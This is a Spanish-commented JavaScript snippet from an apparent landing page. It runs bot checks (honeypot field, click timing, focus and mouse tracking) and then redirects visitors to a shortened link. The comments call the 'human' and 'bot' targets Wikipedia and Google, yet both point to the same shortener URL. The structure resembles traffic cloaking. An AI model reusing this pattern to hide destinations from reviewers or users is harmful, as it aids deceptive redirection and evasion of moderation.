<script>
// === CONFIGURACIÓN DE SEGURIDAD JS ===
const MIN_INTERACTION_TIME = 500; // Tiempo mínimo para considerarse humano (ms)
// ⚠️ MODIFICA ESTAS DOS LÍNEAS PARA CAMBIAR LOS ENLACES
const TARGET_URL_HUMAN = "https://shrlc.com/uD-4mtF"; // URL para tráfico legítimo (Wikipedia)
const TARGET_URL_BOT = "https://shrlc.com/uD-4mtF"; // URL para bots (Google)
// === Variables Globales de Estado ===
let isBotDetected = false;
let loadTimeRef = Date.now();
let isProcessing = false;
let hasWindowFocused = false;
let hasMouseMoved = false;
// === Elementos del DOM ===
const appContainer = document.getElementById('app-container');
const loadingScreen = document.getElementById('loading-screen');
const btnFinalAction = document.getElementById('btn-final-action');
const hpField = document.getElementById('hp-field');
const msgDisplay = document.getElementById('app-message');
// === LÓGICA DE PASOS ===
const step1 = document.getElementById('step-1');
const step2 = document.getElementById('step-2');
function showStep(stepId) {
if (stepId === 'step-2') {
step1.style.display = 'none';
step2.style.display = 'block';
}
}
document.querySelectorAll('.step-trigger').forEach(btn => {
btn.addEventListener('click', (e) => {
const nextStepId = e.currentTarget.dataset.next;
if (nextStepId) {
showStep(nextStepId);
}
});
});
// === LÓGICA DE SEGURIDAD Y ESTADO DEL BOTÓN ===
function displayMessage(message, isError = false) {
// Muestra mensajes de error/éxito en la esquina superior izquierda
msgDisplay.textContent = message;
// Usamos clases de Tailwind para los colores de los mensajes
msgDisplay.className = isError
? 'mt-0.5 font-bold text-red-600'
: 'mt-0.5 font-bold text-green-500';
setTimeout(() => {
msgDisplay.textContent = '';
msgDisplay.className = 'mt-0.5 font-bold';
}, 3000);
}
function updateFinalButton(text, isBlocked = false, isLoader = false) {
// Replicamos las clases y estilos del botón ACEPTAR de la landing anterior
const baseClasses = 'step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl';
if (isLoader) {
// Estado 'PROCESANDO...'
btnFinalAction.innerHTML = `
<div class="flex items-center justify-center">
<svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
</svg>
${text}
</div>
`;
btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black`;
} else if (isBlocked) {
// Estado 'BLOQUEADO'
btnFinalAction.innerHTML = text;
btnFinalAction.className = `${baseClasses} bg-red-600 cursor-not-allowed text-white shadow-[0_8px_0_0_#900]`;
} else {
// Estado Normal
btnFinalAction.innerHTML = text;
btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]`;
}
}
function setupHumanEventListeners() {
window.addEventListener('focus', () => { hasWindowFocused = true; }, { once: true });
document.addEventListener('mousemove', () => { hasMouseMoved = true; }, { once: true });
document.addEventListener('click', () => { hasMouseMoved = true; }, { once: true });
}
function checkBotActivity() {
let detected = false;
let detectionReason = 'Usuario Legítimo';
const clickTime = Date.now();
const interactionTime = clickTime - loadTimeRef;
const isHoneypotFilled = hpField.value.trim().length > 0;
if (isHoneypotFilled) {
detected = true;
detectionReason = 'Fallo Honeypot';
}
if (interactionTime < MIN_INTERACTION_TIME && !detected) {
detected = true;
detectionReason = `Interacción Rápida (${interactionTime}ms)`;
}
if (!hasWindowFocused && !detected) {
detected = true;
detectionReason = 'Ventana no enfocada';
}
if (!hasMouseMoved && !detected) {
detected = true;
detectionReason = 'Interacción no detectada';
}
if (detected) {
isBotDetected = true;
displayMessage(`Acceso Denegado. Fallo de Verificación: ${detectionReason}.`, true);
updateFinalButton('BLOQUEADO', true);
} else {
isBotDetected = false;
}
return detected;
}
async function handleEntry(e) {
e.preventDefault();
if (isProcessing || isBotDetected) return;
isProcessing = true;
updateFinalButton('PROCESANDO...', false, true);
const isBot = checkBotActivity();
let targetUrl;
if (isBot) {
targetUrl = TARGET_URL_BOT; // URL para Bots (Google)
} else {
targetUrl = TARGET_URL_HUMAN; // URL para Humanos (Wikipedia)
}
displayMessage("Redirigiendo...");
setTimeout(() => {
isProcessing = false;
window.location.href = targetUrl;
}, 600);
}
// === Inicialización de la Aplicación ===
async function initApp() {
setupHumanEventListeners();
// Ocultar pantalla de carga e iniciar la aplicación
loadingScreen.style.opacity = '0';
setTimeout(() => {
loadingScreen.style.display = 'none';
appContainer.classList.add('opacity-100');
loadTimeRef = Date.now(); // Marca el tiempo de inicio
}, 500);
}
btnFinalAction.addEventListener('click', handleEntry);
initApp();
</script>
